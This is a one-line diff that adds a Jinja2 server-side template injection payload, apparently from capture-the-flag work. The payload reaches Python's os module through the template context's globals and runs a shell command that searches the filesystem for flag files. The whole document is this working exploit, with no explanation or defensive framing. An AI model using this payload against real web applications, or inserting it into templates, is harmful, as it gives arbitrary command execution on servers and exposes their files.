@@ -1,0 +1,1 @@
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('find / -name "*flag*"').read() }}
